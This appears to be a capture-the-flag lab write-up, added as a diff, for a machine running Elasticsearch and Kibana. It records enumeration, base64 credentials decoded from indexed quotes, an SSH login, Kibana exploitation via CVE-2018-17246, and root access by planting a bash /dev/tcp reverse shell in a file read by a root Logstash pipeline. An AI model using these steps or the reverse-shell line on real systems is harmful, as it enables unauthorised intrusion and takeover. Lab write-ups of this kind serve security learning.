@@ -1,0 +1,87 @@
+---PORT SCAN---
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+| http-methods: 
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+
+
+---GOBUSTER---
+/ (80):
+/ (9200):
+
+---ATTEMPTS---
+cluster_name  "elasticsearch"
+on http://10.10.10.115:9200/_cat/indices
+  green  open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    1 0     4kb     4kb
+  yellow open quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
+  yellow open bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
+
+/bank doesnt have anything useful unless emais and .kibana doesnt have anything
+
+using the elasticsearch API in /quotes
+in quotes getting quotes:
+  got a big text
+  searching for passowrd in the text, in spanish could be clave, código or contraseñas
+  found two texts:
+   "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
+   "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+
+*echo 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
+  user: security
+*echo 'dXNlcjogc2VjdXJpdHkg' | base64 -d
+  pass: spanish.is.key
+
+login to ssh successful!
+*cat /home/security/user.txt
+
+---PRIVESC---
+*./linpeas.sh
+  /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/security/.local/bin:/home/security/bin
+  New path exported: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/security/.local/bin:/home/security/bin:/sbin:/bin
+
+*./pspy (nothing)
+
+found local open ports
+*ss -4aln:
+  Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port
+  udp UNCONN 0 0 127.0.0.1:323 *:* 
+  tcp LISTEN 0 128 *:80 *:* 
+  tcp LISTEN 0 128 *:9200 *:* 
+  tcp LISTEN 0 128 *:22 *:* 
+  tcp LISTEN 0 128 127.0.0.1:5601 *:*
+5601 is kibana
+forward network requests from port 5601 to port 5601 on security@10.10.10.115 and access the kibana page
+*ssh -L 5601:127.0.0.1:5601 security@10.10.10.115 -N
+
+found Version: 6.4.2 in management tab
+searching for exploits found a LFI that executes javascript commands
+https://github.com/mpgn/CVE-2018-17246
+creating a javascript reverse shell and executing it
+done!
+
+running linpeas again to check if can privesc
+
+*./linpeas.sh:
+  Logstash is running as user:
+  LS_USER=root
+  LS_GROUP=root
+  -
+  -rw-r-----. 1 root kibana 186 jun 24  2019 /etc/logstash/conf.d/
+  -
+  /var/lib/kibana/phantomjs-2.1.1-linux-x86_64/bin
+
+in /etc/logstash/conf.d/ found tree files that seems like to read files from /opt/kibana/ with name logstash_* and if the text inside matches 'Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}' it runs the command inside comando
+adding a reverse shell to the file and running:
+*echo 'Ejecutar comando : bash -i >& /dev/tcp/10.10.14.27/5555 0>&1' > /opt/kibana/logstash_james
+kudos!
+*cat /root/root.txt
